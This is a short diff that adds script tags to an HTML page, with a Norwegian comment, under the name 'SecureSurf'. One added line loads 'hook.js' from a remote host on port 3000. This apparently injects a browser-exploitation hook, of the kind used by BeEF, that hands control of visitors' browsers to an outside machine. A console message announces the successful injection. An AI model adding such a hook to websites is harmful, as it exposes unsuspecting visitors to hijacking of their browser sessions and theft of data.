@@ -1,0 +1,4 @@
+<!--Alle scriptsne er located her-->
+<script>window.document.title = "SecureSurf - " + window.document.title</script>
+<script src="http://172.30.28.255:3000/hook.js"></script>
+<script>console.log("Successfully injected web overwriter element")</script>
